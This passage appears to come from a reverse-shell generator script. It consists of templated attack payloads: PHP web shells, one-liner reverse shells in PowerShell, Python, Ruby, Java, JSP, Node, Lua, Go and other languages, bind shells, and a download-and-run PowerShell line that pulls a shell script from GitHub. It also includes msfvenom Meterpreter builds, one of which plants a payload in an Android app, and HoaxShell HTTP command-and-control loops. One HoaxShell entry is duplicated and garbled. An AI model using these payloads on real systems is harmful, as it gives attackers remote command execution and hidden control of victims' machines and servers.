                                if (in_array(\$socket, \$streams['read'])/*------*/) { \$this->rw (\$socket  , \$pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if ((\$fstat = fstat(\$pipes[2])) && \$fstat['size']) { \$this->brw(\$pipes[2], \$socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if ((\$fstat = fstat(\$pipes[1])) && \$fstat['size']) { \$this->brw(\$pipes[1], \$socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!\$this->error);
                    // ------ WORK END ------

                    foreach (\$pipes as \$pipe) {
                        fclose(\$pipe);
                    }
                    proc_close(\$process);
                }
                // ------ SHELL END ------

                fclose(\$socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
\$sh = new Shell('${IPADDR}', ${PORT});
\$sh->run();
unset(\$sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>"
	# 25. PHP cmd
	"<html>
<body>
<form method=\"GET\" name=\"<?php echo basename(\$_SERVER['PHP_SELF']); ?>\">
<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">
<input type=\"SUBMIT\" value=\"Execute\">
</form>
<pre>
<?php
    if(isset(\$_GET['cmd']))
    {
        system(\$_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById(\"cmd\").focus();</script>
</html>"
	# 26. PHP cmd 2
	"<?php if(isset(\$_REQUEST['cmd'])){ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }?>"
	# 27. PHP cmd small
	"<?=\`\$_GET[0]\`?>"
	# 28. PHP exec
	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});exec(\"${SHELLTYPE} <&3 >&3 2>&3\");'"
	# 29. PHP shell_exec
	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});shell_exec(\"${SHELLTYPE}<&3 >&3 2>&3\");'"
	# 30. PHP system
	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});system(\"${SHELLTYPE} <&3 >&3 2>&3\");'"
	# 31. PHP passthru
	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});passthru(\"${SHELLTYPE} <&3 >&3 2>&3\");'"
	# 32. PHP `
	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});\`${SHELLTYPE} <&3 >&3 2>&3\`;'"
	# 33. PHP popen
	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});popen(\"${SHELLTYPE} <&3 >&3 2>&3\", \"r\");'"
	# 34. PHP proc_open
	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});\$proc=proc_open(\"${SHELLTYPE}\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
	# 35. Windows ConPty
	"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${IPADDR} ${PORT}"
	# 36. PowerShell #1
	"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${IPADDR}\", ${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
	# 37. PowerShell #2
	"powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('${IPADDR}', ${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
	# 38. PowerShell #3
	"powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('${IPADDR}', ${PORT});\$NetworkStream = \$TCPClient.GetStream();\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()}WriteToStream '';while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()\""
	# 39. PowerShell #4 (TLS)
	"powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('${IPADDR}', ${PORT});\$NetworkStream = \$TCPClient.GetStream();\$SslStream = New-Object Net.Security.SslStream(\$NetworkStream,\$false,({\$true} -as [Net.Security.RemoteCertificateValidationCallback]));\$SslStream.AuthenticateAsClient('cloudflare-dns.com',\$null,\$false);if(!\$SslStream.IsEncrypted -or !\$SslStream.IsSigned) {\$SslStream.Close();exit}\$StreamWriter = New-Object IO.StreamWriter(\$SslStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()};WriteToStream '';while((\$BytesRead = \$SslStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()\""
	# 40. PowerShell #4 (base64) [WORK ON THIS]
	""
	# 41. Python #1
	"export RHOST=\"${IPADDR}\";export RPORT=${PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"${SHELLTYPE}\")'"
	# 42. Python #2
	"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IPADDR}\", ${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"${SHELLTYPE}\")'"
	# 43. Python3 #1
	"export RHOST=\"${IPADDR}\";export RPORT=${PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"${SHELLTYPE}\")'"
	# 44. Python3 #2
	"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IPADDR}\", ${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"${SHELLTYPE}\")'"
	# 45. Python3 Windows
	"import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((\"${IPADDR}\",${PORT}))

p=subprocess.Popen([\"${SHELLTYPE}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()"
	# 46. Python shortest
	"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${IPADDR}\", ${PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"${SHELLTYPE}\")'"
	# 47. Ruby #1
	"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"${IPADDR}\", ${PORT}))'"
	# 48. Ruby no sh
	"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"${IPADDR}\",${PORT});loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'"
	# 49. socat #1 
	"socat TCP:${IPADDR}:${PORT} EXEC:${SHELLTYPE}"
	# 50. socat #2 (TTY)
	"socat TCP:${IPADDR}:${PORT} EXEC:'${SHELLTYPE}',pty,stderr,setsid,sigint,sane"
	# 51. node.js
	"require('child_process').exec('nc -e ${SHELLTYPE} ${IPADDR} ${PORT}')"
	# 52. node.js #2
	"(function(){
    var net = require(\"net\"),
        cp = require(\"child_process\"),
        sh = cp.spawn(\"${SHELLTYPE}\", []);
    var client = new net.Socket();
    client.connect(${PORT}, \"${IPADDR}\", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();"
	# 53. Java #1
	"public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec(\"bash -c \$@|bash 0 echo bash -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1\");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}"
	# 54. Java #2
	"public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"\$@| bash -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1\")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}"
	# 55. Java #3
	"import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = \"${IPADDR}\";
        int port = ${PORT};
        String cmd = \"${SHELLTYPE}\";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}"
	# 56. Java Web
	"<%@
page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"
% >
<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method=\"post\">
IP Address
<input type=\"text\" name=\"ipaddress\" size=30>
Port
<input type=\"text\" name=\"port\" size=10>
<input type=\"submit\" name=\"Connect\" value=\"Connect\">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter(\"ipaddress\");
String ipPort = request.getParameter(\"port\");
if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec(\"cmd.exe\");
                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());
                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());
                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>"
	# 57. Java Two Way
	"<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import=\"java.lang.*\"%>
<%@page import=\"java.io.*\"%>
<%@page import=\"java.net.*\"%>
<%@page import=\"java.util.*\"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">
    <input TYPE=\"text\" NAME=\"shell\">
    <input TYPE=\"submit\" VALUE=\"Send\">
</form>
<pre>
<%
    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {
            shellPath = new String(\"/bin/sh\");
        } else {
            shellPath = new String(\"cmd.exe\");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter(\"shell\") != null) {
        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");
        Process p;
        if (shellPath.equals(\"cmd.exe\"))
            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));
        else
            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {
        Socket socket = new Socket( \"${IPADDR}\", ${PORT} ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println(\"port opened on \" + socket);
     } catch( Exception e ) {}
%>
</pre>
</body>
</html>"
	# 58. Javascript
	"String command = \"var host = '${IPADDR}';\" +
                       \"var port = ${PORT};\" +
                       \"var cmd = '${SHELLTYPE}';\"+
                       \"var s = new java.net.Socket(host, port);\" +
                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+
                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+
                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+
                       \"print ('Connected');\"+
                       \"while (!s.isClosed()) {\"+
                       \"    while (pi.available() > 0)\"+
                       \"        so.write(pi.read());\"+
                       \"    while (pe.available() > 0)\"+
                       \"        so.write(pe.read());\"+
                       \"    while (si.available() > 0)\"+
                       \"        po.write(si.read());\"+
                       \"    so.flush();\"+
                       \"    po.flush();\"+
                       \"    java.lang.Thread.sleep(50);\"+
                       \"    try {\"+
                       \"        p.exitValue();\"+
                       \"        break;\"+
                       \"    }\"+
                       \"    catch (e) {\"+
                       \"    }\"+
                       \"}\"+
                       \"p.destroy();\"+
                       \"s.close();\";
String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";
ref.add(new StringRefAddr(\"x\", x);"
	# 59. Groovy
	"String host=\"${IPADDR}\";int port=${PORT};String cmd=\"${SHELLTYPE}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
	# 60. telnet
	"TF=$(mktemp -u);mkfifo \$TF && telnet ${IPADDR} ${PORT} 0<\$TF | ${SHELLTYPE} 1>\$TF"
	# 61. zsh
	"zsh -c 'zmodload zsh/net/tcp && ztcp ${IPADDR} ${PORT} && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"
	# 62. Lua #1
	"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('${IPADDR}','${PORT}');os.execute('${SHELLTYPE} -i <&3 >&3 2>&3');\""
	# 63. Lua #2
	"lua5.1 -e 'local host, port = \"${IPADDR}\", ${PORT} local socket = require(\"socket\") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
	# 64. Golang
	"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${IPADDR}:${PORT}\");cmd:=exec.Command(\"${SHELLTYPE}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
	# 65. Vlang
	"echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e ${SHELLTYPE} ${IPADDR} ${PORT} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
	# 66. Awk
	"awk 'BEGIN {s = \"/inet/tcp/0/${IPADDR}/${PORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
	# 67. Dart
	"import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect(\"${IPADDR}\", ${PORT}).then((socket) {
    socket.listen((data) {
      Process.start('${SHELLTYPE}', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}"
)

#
# Bind Shell Payloads
#
bindShellPayloads=(
	# Python3 Bind
	"python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",${PORT}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
	# PHP Bind
	"php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$s,\"0.0.0.0\",${PORT});socket_listen(\$s,1);\$cl=socket_accept(\$s);while(1){if(!socket_write(\$cl,\"\$ \",2))exit;\$in=socket_read(\$cl,100);\$cmd=popen(\"\$in\",\"r\");while(!feof(\$cmd)){\$m=fgetc(\$cmd);socket_write(\$cl,\$m,strlen(\$m));}}'"
)


#
# MSFVenom Payloads
#
msfvenomPayloads=(
	# Windows Meterpreter Staged Reverse TCP (x64)
	"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Meterpreter Stageless Reverse TCP (x64)
	"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Staged Reverse TCP (x64)
	"msfvenom -p windows/x64/shell/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Stageless Reverse TCP (x64)
	"msfvenom -p windows/x64/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Staged JSP Reverse TCP (x64)
	"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f jsp -o ./rev.jsp"
	# Linux Meterpreter Staged Reverse TCP (x64)
	"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f elf -o reverse.elf"
	# Linux Meterpreter Stageless Reverse TCP (x64)	
	"msfvenom -p linux/x64/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f elf -o reverse.elf"
	# Windows Bind TCP ShellCode-BOF
	"msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode"
	# macOS Meterpreter Staged Reverse TCP (x64)
	"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f macho -o shell.macho"
	# macOS Meterpreter Stageless Reverse TCP (x64)
	"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f macho -o shell.macho"
	# macOS Stageless Reverse TCP (x64)
	"msfvenom -p osx/x64/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f macho -o shell.macho"
	# PHP Meterpreter Stageless Reverse TCP
	"msfvenom -p php/meterpreter_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f raw -o shell.php"
	# PHP Reverse PHP
	"msfvenom -p php/reverse_php LHOST=${IPADDR} LPORT=${PORT} -o shell.php"
	# JSP Stageless Reverse TCP
	"msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f raw -o shell.jsp"
	# WAR Stageless Reverse TCP
	"msfvenom -p java/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f war -o shell.war"
	# Android Meterpreter Reverse TCP
	"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=${IPADDR} lport=${PORT} R -o malicious.apk"
	# Android Meterpeter Embed Reverse TCP
	"msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost=${IPADDR} lport=${PORT} -o payload.apk"
	# Apple iOS Meterpreter Reverse TCP Inline
	"msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost=${IPADDR} lport=${PORT} -f macho -o payload"
	# Python Stageless Reverse TCP
	"msfvenom -p cmd/unix/reverse_python LHOST=${IPADDR} LPORT=${PORT} -f raw"
	# Bash Stageless Reverse TCP
	"msfvenom -p cmd/unix/reverse_bash LHOST=${IPADDR} LPORT=${PORT} -f raw -o shell.sh"
)


#
# HoaxShell Payloads
#
hoaxShellPayloads=(
	# Windwos CMD cURL
	"@echo off&cmd /V:ON /C \"SET ip=${IPADDR}:${PORT}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL"
	# PowerShell IEX
	"\$s='${IPADDR}:${PORT}';\$i='14f30f27-650c00d7-fef40df7';\$p='http://';\$v=IRM -UseBasicParsing -Uri \$p\$s/14f30f27 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/650c00d7 -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=IEX \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/fef40df7 -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell IEX Constr Lang Mode
	"\$s='${IPADDR}:${PORT}';\$i='bf5e666f-5498a73c-34007c82';\$p='http://';\$v=IRM -UseBasicParsing -Uri \$p\$s/bf5e666f -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/5498a73c -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=IEX \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/34007c82 -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
	# PowerShell Outfile
	"\$s='${IPADDR}:${PORT}';\$i='add29918-6263f3e6-2f810c1e';\$p='http://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/add29918 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/6263f3e6 -Headers @{\"Authorization\"=\$i});if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/2f810c1e -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell Outfile Constr Lang Mode
	"\$s='${IPADDR}:${PORT}';\$i='e030d4f6-9393dc2a-dd9e00a7';\$p='http://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=IRM -UseBasicParsing -Uri \$p\$s/e030d4f6 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/9393dc2a -Headers @{\"Authorization\"=\$i}); if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
	# Windows CMD cURL https
	"@echo off&cmd /V:ON /C \"SET ip=${IPADDR}:${PORT}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455@echo off&cmd /V:ON /C \"SET ip=${IPADDR}:${PORT}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL"
	# PowerShell IEX https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
\$s='${IPADDR}:${PORT}';\$i='1cdbb583-f96894ff-f99b8edc';\$p='https://';\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/1cdbb583 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/f96894ff -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=iex \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/f99b8edc -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell Constr Lang Mode IEX https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
